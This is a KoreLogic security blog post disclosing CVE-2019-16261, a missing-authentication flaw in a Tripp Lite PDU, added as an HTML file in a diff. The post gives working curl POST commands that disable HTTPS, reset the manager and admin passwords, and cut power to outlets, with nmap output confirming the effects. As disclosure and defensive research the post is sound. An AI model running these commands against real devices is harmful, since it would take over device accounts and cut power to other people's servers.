@@ -1,0 +1,297 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <title>KoreLogic Blog</title>
+        <script src="/assets/js/gtag.js?id=UA-118581697-4"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'UA-118581697-4');
+        </script>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <!--[if lte IE 8]><script src="/assets/js/ie/html5shiv.js"></script><![endif]-->
+        <link rel="stylesheet" href="/assets/css/main.css" />
+        <!--[if lte IE 8]><link rel="stylesheet" href="/assets/css/ie8.css" /><![endif]-->
+        <!--[if lte IE 9]><link rel="stylesheet" href="/assets/css/ie9.css" /><![endif]-->
+        <description style="display:none">KoreLogic Blog</description>
+    </head>
+    <body>
+        <div id="page-wrapper">
+            <!-- Header -->
+            <div id="header">
+                <!-- Logo -->
+                <div class="container">
+                    <a href="/" id="logo"><img src="/images/korelogo.png"/></a>
+                </div>
+
+                <!-- Nav -->
+
+<nav id="nav">
+                    <ul>
+                        <li><a href="https://korelogic.com">Main</a></li>
+                        <li class="current"><a href="https://blog.korelogic.com/blog">Blog</a></li>
+                        <li><a href="https://contest.korelogic.com/">Contest</a></li>
+                        <li><a href="https://git.korelogic.com">Tools</a></li>
+                        <li><a href="https://korelogic.com/contact.html">Contact Us</a></li>
+                    </ul>
+                </nav>
+
+            </div>
+
+            <!-- Main -->
+
+            <section class = "wrapper style2">
+                <div class="container">
+                    <div id="content">
+                        <!-- Content -->
+                        <article>
+
+
+<!-- <table width="90%"><tr><td align="right"><span style="color:black; font-size: 16px">2019-08-19</span></td></tr></table> -->
+<div>
+<table width="100%" class="bottomdotted">
+ <tr>
+  <td align="left"><a name="unpatched_fringe_infrastructure_bits"></a><a href="https://blog.korelogic.com/blog/2019/08/19/unpatched_fringe_infrastructure_bits" style="text-decoration:none"><span class="mediumheadlineblue" style="font-size:26px; color:black;">Unpatched Fringe Infrastructure Bits</span></a>
+  <td style="text-align:right"><span style="color:black; font-size: 20px">2019-08-19 11:00</span></td>
+ </tr>
+</table>
+<p>
+<div style="font-size: 18px">
+
+<p>
+Typically during internal network penetration tests, pentesters come
+across many different types of devices. Much of the focus is likely
+on the Windows/UNIX-like systems and critical infrastructure devices
+(e.g., storage, DNS servers, routers, switches, etc.). There are,
+however, a number of other network connected devices that often
+times get passed over due to factors such as function, purpose,
+placement, or lack of sensitive data contained within.
+</p>
+
+<p>
+A pentester may take a second look at a given device because telnet
+or FTP is enabled, but after a cursory glance at the HTTP listener
+and thinking it is a UPS - maybe they will likely skip over it in
+favor of the Linux system running Apache, MySQL, and SSH.
+</p>
+
+<p>
+Welcome to the land of forgotten and misfit toys ... this is not
+exciting, cutting-edge, sexy stuff. These are devices organizations
+typically plug in, configure minimally (just enough to "do the job"),
+and forget about. In this post, I discuss a particular vulnerability
+of a TrippLite Power Distribution Unit (PDU).
+</p>
+
+
+
+<p>
+Out of technical curiosity, I picked up a used TrippLite Power
+Distribution Unit (PDU) several months back. Basically, A PDU is a
+heavy-duty power strip. Often, these units are rack-mountable and
+contain a network management card, so that they can be deployed in
+server rooms or data centers and managed remotely.
+</p>
+
+<h3>Target:</h3>
+
+<pre class="snippet-ns">
+Manufacturer:		Tripp Lite
+Model:			TRIPP LITE PDUMH15AT
+Firmware Version:	12.04.0053
+</pre>
+
+<p>
+There are a number of obvious security issues with this device and
+its firmware version that we will not focus on in this blog post,
+namely:
+</p>
+
+<ul class="default">
+<li>Well-documented, default credentials</li>
+<li>Athentication being performed over cleartext (telnet, ftp, and http)</li>
+<li>Basic Auth being done (every request) over HTTP</li>
+<li>XSS issue in configuring an email contact</li>
+<li>Management interface denial of service issues via dumping memory and four unsuccessful SCP attempts</li>
+</ul>
+
+<p>
+The above list is pretty boring, but there is one more vulnerability
+that's mildly interesting.
+</p>
+
+<h3>Issue: Unauthenticated POSTs</h3>
+
+<p>
+During legitimate, authenticated use, configuration changes to
+the PDU are made through POSTs sent to a number of pages under
+http://&ltIP Address&gt/Forms/. Unfortunately, the PDU does not check
+that these POSTs contain the Basic Auth header, which means that
+an attacker can turn on/off PDU management services, configure
+credentials, or turn on/off power to your servers ... remotely,
+without providing authentication.
+</p>
+
+<p>
+To demonstrate turning off a management service, we will use HTTPS
+as our victim service. First, let's establish that it is running.
+</p>
+
+<pre class="snippet-ns">
+$ nmap -sT -p 80,443 192.168.1.87
+
+Starting Nmap 7.30 ( https://nmap.org ) at 2017-02-13 11:26 CST
+Nmap scan report for 192.168.1.87
+Host is up (0.0021s latency).
+PORT    STATE SERVICE
+80/tcp  open  http
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
+</pre>
+
+<p>
+Next, we issue a POST without authentication to turn the service off.
+</p>
+
+<pre class="snippet-ns">
+$ curl -X POST -d "netweb_access=00000001&nethttp_access=00000001&nethttp_port=80&nethttps_access=
+00000000&nethttps_port=443&savechanges=Save+Changes" http://192.168.1.87/Forms/network_web_1
+</pre>
+
+<p>
+Then, we restart the management interface, which causes our change
+to take effect. Finally, we re-run nmap to show that the HTTPS
+service is now off:
+</p>
+
+<pre class="snippet-ns">
+$ curl -X POST -d "startreset=Restart+PowerAlert" http://192.168.1.87/Forms/requestreset_1
+
+$ nmap -sT -p 80,443 192.168.1.87
+
+Starting Nmap 7.30 ( https://nmap.org ) at 2017-02-13 11:29 CST
+Nmap scan report for 192.168.1.87
+Host is up (0.0035s latency).
+PORT    STATE  SERVICE
+80/tcp  open   http
+443/tcp closed https
+
+Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
+</pre>
+
+<p>
+Okay, mildly interesting ... but what I really want is to log
+into the device and do things. Unfortunately, I don't know the
+password. Wait a tick ... can we use the same unauthenticated POST
+vulnerability to set the password for the manager account? Turns
+out we can, as shown here:
+</p>
+
+<pre class="snippet-ns">
+$ curl -X POST -d "securityrou=guest&securityro1=guest&securityro2=guest&securityrwu=
+manager&securityrw1=manager3&securityrw2=manager3&securityadu=admin&securityad1=admin&securityad2=
+admin&savechanges=Save+Changes" http://192.168.1.87/Forms/system_security_1
+</pre>
+
+<p>
+Once the password has been set, all we need to do is restart the
+management interface:
+</p>
+
+<pre class="snippet-ns">
+$ curl -X POST -d "startreset=Restart+PowerAlert" http://192.168.1.87/Forms/requestreset_1
+</pre>
+
+<p>
+And presto ... we can now login to the manager account using a
+password of 'manager3'. Naturally, you can use the same technique
+to set the admin password as well.
+</p>
+
+<p>
+The web interface allows for authenticated users to turn on/off
+power to individual outlets. As was mentioned, the problem is that
+the POSTs can be sent to the device with the correct data but without
+a Basic Auth header, and the PDU will still honor the request.
+</p>
+
+<p>
+To turn off the power to outlet #1:
+</p>
+
+<pre class="snippet-ns">
+$ curl -X POST -d "actLoadId=1&loadoff1=Off" http://192.168.1.87/Forms/action_load_list_1
+</pre>
+
+<p>
+To turn the power back on again to outlet #1:
+</p>
+
+<pre class="snippet-ns">
+$ curl -X POST -d "actLoadId=1&loadon1=On" http://192.168.1.87/Forms/action_load_list_1
+</pre>
+
+<p>
+The unauthenticated POST vulnerability was reported to TrippLite in
+Q1 of 2018. They were unconcerned when we reported the issue since
+a newer version of the firmware that was not vulnerable had already
+been released. TrippLite did not elaborate on whether or not the
+vulnerability had been reported previously or if the new version of
+the firmware (which appears to be a significant re-write to the web
+interface) addressed the issue intentionally (or unintentionally).
+</p>
+
+<p>
+But, the question I have is: "How many organizations include
+network-attached PDUs in their patch management program?"
+</p>
+
+<b>
+Update: On 2019-09-12, CVE-2019-16261 was assigned to this vulnerability.
+</b>
+
+</div>
+<br />
+<table width=95% class="bottomdotted">
+ <tr>
+  <td align="left">0 comments
+  <td style="text-align:right"> <i>Posted by <span class="bluehighlight">Jim Becher</span> at: 11:00 <a href="https://blog.korelogic.com/blog"></a>
+  <a href="https://blog.korelogic.com/blog/2019/08/19/unpatched_fringe_infrastructure_bits">permalink</a></i>
+ </tr>
+</table>
+</p>
+
+<b></b>
+
+<p class="commentform">Comments are closed for this story.</p>
+</p>
+</div>
+<br />
+            <div id="footer">
+                <div class="container">
+                    <!-- Icons -->
+                    <ul class="icons">
+                        <li><a href="https://twitter.com/CrackMeIfYouCan" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                        <li><a href="https://github.com/korelogicsecurity" class="icon fa-github"><span class="label">GitHub</span></a></li>
+                        <li><a href="https://www.linkedin.com/company/korelogic" class="icon fa-linkedin"><span class="label">LinkedIn</span></a></li>
+                    </ul>
+                    <br>
+                    <ul class="icons">
+                        <p>Copyright 2021. KoreLogic Security. All rights reserved</p>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Scripts -->
+        <script src="/assets/js/jquery.min.js"></script>
+        <script src="/assets/js/jquery.dropotron.min.js"></script>
+        <script src="/assets/js/skel.min.js"></script>
+        <script src="/assets/js/util.js"></script>
+        <!--[if lte IE 8]><script src="/assets/js/ie/respond.min.js"></script><![endif]-->
+        <script src="/assets/js/main.js"></script>
+    </body>
+</html>
